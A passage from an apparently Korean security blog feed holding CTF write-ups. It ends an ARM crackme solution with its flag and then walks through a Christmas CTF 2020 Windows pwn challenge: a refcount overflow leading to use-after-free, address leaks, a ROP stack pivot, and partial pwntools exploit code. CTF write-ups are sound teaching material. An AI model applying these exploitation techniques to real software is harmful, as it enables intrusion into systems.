class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">44</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>,<span class="hljs-attribute">0x6E</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">12</span><span class="hljs-attribute">0000000000000aec</span> &lt;sub_aec&gt;: <span class="hljs-attribute">aec</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> af0:   910003fd    mov x29, sp</span><span class="hljs-meta"> af4:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">af8</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">afc</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">29</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">b00</span>:   <span class="hljs-number">2</span>a<span class="hljs-number">0003</span>e<span class="hljs-number">3</span>    mov w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b04</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">2</span>    ldr x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b08</span>:   <span class="hljs-number">528003</span>e<span class="hljs-number">1</span>    mov w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span>f &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;   // #<span class="hljs-number">31</span> <span class="hljs-attribute">b0c</span>:   <span class="hljs-number">90000000</span>    adrp    x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@page <span class="hljs-attribute">b10</span>:   <span class="hljs-number">91382000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@pageoff <span class="hljs-attribute">b14</span>:   <span class="hljs-number">97</span>ffffba    bl  <span class="hljs-number">9</span>fc &lt;sub_<span class="hljs-number">9</span>fc&gt; <span class="hljs-attribute">b18</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b1c</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>c    bl  <span class="hljs-number">810</span> &lt;puts@plt&gt; <span class="hljs-attribute">b24</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">b28</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> b2c:   d65f03c0    ret</span></code></pre><p>&#xC785;&#xB825; &#xAC12;&#xACFC; value2&#xB97C; &#xC778;&#xC790;&#xB85C; <code>sub_9fc</code>&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>sub_9fc</code>&#xC758; &#xACBD;&#xC6B0; &#xC544;&#xAE4C; python script&#xB97C; &#xC9DC; &#xB193;&#xC558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADF8;&#xB0E5; &#xAC12;&#xC744; &#xC785;&#xB825;&#xD558;&#xC5EC; &#xC5F0;&#xC0B0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">string3 = [ &#xA0; &#xA0;<span class="hljs-number">0x69</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0x3C</span>,<span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x17</span>,<span class="hljs-number">0x6E</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x12</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string3)): &#xA0; &#xA0;flag += chr(string3[i] ^ ord(user_input[i % len(user_input)]))print(flag)<span class="hljs-string">&apos;&apos;&apos;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">XMAS{s4nta_can_enter_the_h0use}</span><span class="hljs-string">&apos;&apos;&apos;</span></code></pre><p>FLAG : XMAS{s4nta_can_enter_the_h0use}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>arm</tag>
      
      <tag>crackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Address Book</title>
    <link href="/2020/12/29/l0ch/address_book/"/>
    <url>/2020/12/29/l0ch/address_book/</url>
    
    <content type="html"><![CDATA[<p>&#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xB0B8; Windows &#xD658;&#xACBD;&#xC758; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;..! &#xB300;&#xD68C; &#xB2F9;&#xC77C;&#xB0A0; &#xC2DC;&#xC791;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xBB38;&#xC81C;&#xC774;&#xB098; 12&#xC2DC;&#xAC04;&#xC774; &#xB418;&#xB3C4;&#xB85D; &#xC194;&#xBC84;&#xAC00; &#xC548;&#xB098;&#xC640;&#xC11C; solvable&#xD55C; &#xBB38;&#xC81C;&#xAC00; &#xC544;&#xB2CC;&#xAC00; &#xB300;&#xD68C; &#xB0B4;&#xB0B4; &#xAC71;&#xC815;&#xD588;&#xB358; &#xCE5C;&#xAD6C;&#xC774;&#xAE30;&#xB3C4; &#xD558;&#xC8E0; &#x3160;&#x3160;</p><p>idioth&#xD615;&#xC774; &#xB300;&#xD68C; &#xC911;&#xAC04;&#xC5D0; 0&#xC194;&#xBC84;&#xB97C; &#xC704;&#xD55C; &#xC120;&#xBB3C;&#xC774;&#xB77C;&#xACE0; &#xC9E4;&#xC744; &#xD558;&#xB098; &#xBCF4;&#xB0B4;&#xC92C;&#xB294;&#xB370;&#x2026;</p><p><img src="/2020/12/29/l0ch/address_book/1.png" alt></p><blockquote><p>&#xC98C;&#xCBD4;&#x2026; &#xB290;&#xBBC0; &#xADF8;&#xBBD1;&#xB290;&#x2026;^^</p></blockquote><p>&#xADF8;&#xB798;&#xB3C4; &#xB300;&#xD68C; 12&#xC2DC;&#xAC04;&#xB9CC;&#xC5D0; &#xB2E4;&#xD589;&#xD788; &#xC194;&#xBC84;&#xAC00; &#xB098;&#xC640;&#xC11C; &#xB2E4;&#xD589;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4; &#x314E;&#x314E;.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>&#xBA3C;&#xC800;, &#xBB38;&#xC81C; &#xD658;&#xACBD;&#xBD80;&#xD130; &#xBCF4;&#xC2DC;&#xC8E0;</p><blockquote><p>Windows 64bit Version 10.0.19041.264 ASLR: True DEP: True SafeSEH: True Stack Cookie: True</p></blockquote><p>64bit &#xC708;&#xB3C4;&#xC6B0; 10 &#xD658;&#xACBD;&#xC774;&#xBA70;, &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC740; &#xBAA8;&#xB450; &#xAC78;&#xB824;&#xC788;&#xB124;&#xC694;!</p><p>&#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xB4E4;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/address_book/2.png" alt></p><ol><li><p>Add address Info</p><p>name, address, city&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xACE0; address info&#xB97C; &#xCD94;&#xAC00;</p></li><li><p>Address Info List</p><p>&#xCD94;&#xAC00;&#xD55C; address info&#xB4E4;&#xC744; &#xCD9C;&#xB825;</p></li><li><p>Delete address Info</p><p>address info&#xB97C; &#xC0AD;&#xC81C;. &#xC774; &#xB54C; &#xC0AD;&#xC81C;&#xB41C; info&#xB294; Recycle Bin List&#xC5D0; &#xCD94;&#xAC00;</p></li><li><p>Restore address Info</p><p>&#xC0AD;&#xC81C;&#xB41C; info&#xB97C; &#xC6D0;&#xB798; List&#xB85C; &#xBCF5;&#xAD6C;</p></li><li><p>Modify address Info</p><p>&#xC218;&#xC815;&#xD560; address info&#xB97C; &#xC120;&#xD0DD;&#xD574; name, address, city&#xB97C; &#xC218;&#xC815; &#xAC00;&#xB2A5;</p></li><li><p>Empty List</p><p>address list&#xC640; recycle bin list &#xD56D;&#xBAA9;&#xC744; &#xBAA8;&#xB450; &#xC0AD;&#xC81C;</p></li><li><p>Exit</p></li></ol><p>7&#xBC88;&#xC73C;&#xB85C; &#xC885;&#xB8CC;&#xD558;&#xBA74;</p><p><img src="/2020/12/29/l0ch/address_book/3.png" alt></p><p>list&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xB728;&#xB294;&#xB370;, &#xC606;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB85C; &#xBCF4;&#xC774;&#xB294; &#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9AC;&#xC2A4;&#xD2B8;&#xB294; double linked list&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xCC98;&#xC74C;&#xC5D0; <code>Address Book</code>, <code>Recycle Bin</code> &#xB450;&#xAC1C;&#xC758; &#xAC1D;&#xCCB4;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xC5B4; &#xAC01;&#xAC01; 2byte &#xC815;&#xC218; type&#xC758; reference count (&#xCD08;&#xAE30;&#xAC12;=10)&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xAC00; &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xD560; &#xB54C; count&#xAC00; 10 &#xC62C;&#xB77C;&#xAC00;&#xBA70; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xBE60;&#xC838;&#xB098;&#xC62C;&#xB54C; count&#xAC00; 10 &#xAC10;&#xC18C;&#xD558;&#xACE0; 10&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; &#xD560;&#xB2F9;&#xB41C; &#xAC1D;&#xCCB4;&#xB97C; free&#xD558;&#xACE0; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xAC10;&#xC774; &#xC624;&#xC2DC;&#xC8E0;. C++&#xC758; &#xACF5;&#xC720;&#xD3EC;&#xC778;&#xD130; <code>std::shared_ptr</code> &#xB97C; &#xCEE4;&#xC2A4;&#xD140; &#xAD6C;&#xD604;&#xD55C; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>Recycle Bin</code>&#xC758; info&#xB97C; restore&#xD560;&#xB54C; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xB178;&#xB4DC;&#xC5D0;&#xC11C;, <code>Recycle Bin</code>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD55C; next &#xAC12;&#xC774; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xB0A8;&#xC544;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/address_book/4.png" alt><br>&#xB178;&#xB4DC;&#xB97C; &#xB124; &#xAC1C; &#xC0DD;&#xC131;&#xD55C; &#xB4A4; 4, 3&#xC744; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xC0AD;&#xC81C;&#xD558;&#xBA74; Recycle Bin &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/address_book/5.png" alt></p><p>Restore 4&#xB85C; <code>Address List</code>&#xB85C; &#xBCF5;&#xAD6C;&#xD588;&#xC744;&#xB54C; node 4&#xC758; next &#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xC5EC;&#xC804;&#xD788; <code>Recycle Bin</code>&#xC758; 3&#xC744; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/address_book/6.png" alt></p><p>Restore 3&#xC744; &#xD558;&#xBA74; <code>Address List</code>&#xC5D0; index &#xC21C;&#xC11C;&#xC5D0; &#xB9DE;&#xAC8C; 2&#xC640; 4 &#xC0AC;&#xC774;&#xC5D0; &#xC0BD;&#xC785;&#xB418;&#xACE0; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; 3&#xACFC; 4&#xC758; next&#xAC00; &#xAC01;&#xAC01; &#xC11C;&#xB85C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB418;&#xC5B4; &#xC21C;&#xD658;&#xC801;&#xC778; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C4; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>Address List</code>&#xC758; &#xB178;&#xB4DC;&#xB4E4;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xD568;&#xC218;&#xB294; &#xB178;&#xB4DC;&#xC758; next&#xAC00; NULL&#xC77C;&#xB54C;&#xAE4C;&#xC9C0; &#xD639;&#xC740; &#xC785;&#xB825;&#xD55C; &#xC218;&#xB9CC;&#xD07C; &#xC7AC;&#xADC0;&#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; head &#xB178;&#xB4DC;&#xBD80;&#xD130; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC785;&#xB825;&#xD55C; &#xC218;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; reference counter&#xC758;  integer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/address_book/7.png" alt><br>&#xC7AC;&#xADC0;&#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB85C; <code>Address List</code>&#xC758; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xB4E4;&#xC5B4;&#xAC00;&#xB294;&#xB370;, &#xC7AC;&#xADC0;&#xD568;&#xC218;&#xAC00; &#xD55C; &#xBC88; &#xD638;&#xCD9C;&#xB420;&#xB54C;&#xB9C8;&#xB2E4; <code>Address List</code>&#xC758; reference count&#xAC00; 10&#xC529; &#xC99D;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD588;&#xC744; &#xB54C; &#xC815;&#xD655;&#xD788; 3275&#xB9CC;&#xD07C; &#xC7AC;&#xADC0;&#xB85C; &#xCC38;&#xC870;&#xD558;&#xBA74; 2byte &#xC815;&#xC218; &#xC870;&#xAC74;&#xC744; &#xBC97;&#xC5B4;&#xB098;&#xAC8C; &#xB418;&#xC5B4; free &#xC870;&#xAC74;&#xC778; <code>reference count &lt; 10</code> &#xC744; &#xB9CC;&#xC871;&#xD558;&#xAC8C; &#xB418;&#xACE0; AddressBook &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xD55C; &#xBC88; free&#xB429;&#xB2C8;&#xB2E4;.  </p><p>&#xC774;&#xC5B4; Add Address Info&#xC5D0;&#xC11C; &#xB178;&#xB4DC;&#xB97C; &#xC0C8;&#xB85C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; UAF&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC5B4; Address Info&#xC5D0;&#xC11C; <code>name</code> &#xC73C;&#xB85C; vtable &#xC744; overwrite &#xD574; eip control&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; <code>flag.txt</code>&#xB97C; open&#xD588;&#xC73C;&#xB2C8; <code>read</code>&#xC640; <code>write</code>&#xB85C; flag &#xB0B4;&#xC6A9;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">read(<span class="hljs-number">3</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))  <span class="hljs-comment">// 3 : file descriptor</span>write(<span class="hljs-number">1</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))</code></pre><p>ROP&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xAC74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>ntdll.dll</code> base address &#x2192; gadget</p><p><code>ucrtbase.dll</code> base address &#x2192; <code>read</code>, <code>write</code></p><p>&#xC704; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xAD6C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xBA3C;&#xC800; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; imagebase&#xBD80;&#xD130; leak&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>UAF &#xC774;&#xD6C4; leak&#xC740; Address Info&#xB97C; &#xCD9C;&#xB825;&#xD560; &#xB54C; <code>head</code> &#xD3EC;&#xC778;&#xD130; &#xAC12;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xCC38;&#xC870;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC774;&#xC6A9;&#xD574; Address Info&#xC758; <code>city+16</code> &#xC5D0;&#xC11C; <code>head</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; overwrite &#x2192; OOB read&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xC810;&#xC744; &#xC774;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/address_book/8.png" alt></p><p>&#xBA87;&#xBC88; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xBA74; &#xAC1D;&#xCCB4;&#xAC04; offset &#xC5D0; &#xD328;&#xD134;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. offset&#xC744; &#xACC4;&#xC0B0;&#xD574;&#xC11C; city+16 &#xC5D0; Recycle Bin&#xC758; &#xC8FC;&#xC18C;&#xB85C; head &#xB97C; overwrite&#xD558;&#xACE0; 2&#xBC88; &#xBA54;&#xB274;&#xB85C; &#xCD9C;&#xB825;&#xD558;&#xBA74; vtable &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/address_book/9.png" alt></p><p><code>Recycle Bin</code>&#xC758; vtable offset&#xC740; 0x6960&#xC774;&#xB2C8; leak&#xD55C; vtable&#xC5D0; offset&#xB9CC;&#xD07C; &#xBE7C;&#xBA74; imagebase&#xAC00; &#xB098;&#xC624;&#xACA0;&#xAD70;&#xC694;!</p><p>&#xC774;&#xC81C; imagebase&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; dll &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD558;&#xB294;&#xAC74; &#xC27D;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xAD6C;&#xD558;&#xACE0;&#xC2F6;&#xC740; dll&#xC758; &#xC544;&#xBB34; &#xD568;&#xC218;&#xB098; IAT &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; offset&#xC744; &#xCC3E;&#xACE0;, imagebase+offset &#xC8FC;&#xC18C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; dll &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB97C; leak&#xD558;&#xBA74; &#xB418;&#xC8E0;. <code>ntdll</code>&#xBD80;&#xD130; &#xAD6C;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/address_book/10.png" alt></p><p><code>!dh imagebase</code> &#xB85C; IAT offset&#xC744; &#xCC3E;&#xACE0; Import&#xB41C; dll &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xC544;&#xBCFC;&#xAC8C;&#xC694;</p><p><img src="/2020/12/29/l0ch/address_book/11.png" alt></p><p><code>ntdll!RtlInitializeSListHead</code> &#xAC00; imagebase+ 0x6060&#xC5D0; &#xC788;&#xB124;&#xC694;.</p><p><code>ucrtbase!free</code> &#xB3C4; imagebase + 0x61f0 &#xC778;&#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>vtable&#xC744; leak&#xD588;&#xC744; &#xB54C;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; <code>head</code>&#xB97C; overwrite&#xD574; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC788;&#xB294; &#xAC12;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xACE0; &#xAC01;&#xAC01; dll &#xB0B4; offset&#xC744; &#xBE7C;&#xC8FC;&#xBA74; dll base address&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="imagebase-dll-leak"><a href="#imagebase-dll-leak" class="headerlink" title="imagebase/dll leak"></a>imagebase/dll leak</h2><pre><code class="hljs python"><span class="hljs-comment"># &#xC804;&#xCCB4; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798; Exploit Code &#xCC38;&#xC870;</span><span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&apos;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span><span class="hljs-comment"># leak ucrtbase</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&apos;&gt;&apos;</span>)</code></pre><p><img src="/2020/12/29/l0ch/address_book/12.png" alt></p><p>&#xC774;&#xC81C; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xB3C4; &#xBAA8;&#xB450; &#xAD6C;&#xD588;&#xACE0; eip&#xB3C4; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8;, ROP chain&#xB9CC; &#xAD6C;&#xC131;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><code>mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</code> &#xB85C; rsp&#xB97C; &#xD604;&#xC7AC; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB85C; pivot &#xD55C;&#xB4A4; <code>read</code>, <code>write</code>&#xB97C; &#xCC28;&#xB840;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xBA74; flag&#xB97C; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2020/12/29/l0ch/address_book/13.png" alt></p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addAddr</span>(<span class="hljs-params">name, address, city</span>):</span>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recvuntil(<span class="hljs-string">&apos;:&apos;</span>))p.sendline(name)print(p.recvuntil(<span class="hljs-string">&apos;:&apos;</span>))p.sendline(address)print(p.recvuntil(<span class="hljs-string">&apos;:&apos;</span>))p.sendline(city)print(p.recvuntil(<span class="hljs-string">&apos;&gt;&apos;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">listAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)print(p.recvuntil(<span class="hljs-string">&apos;&gt;&apos;</span>))p.sendline(str(idx))<span class="hljs-function"><span 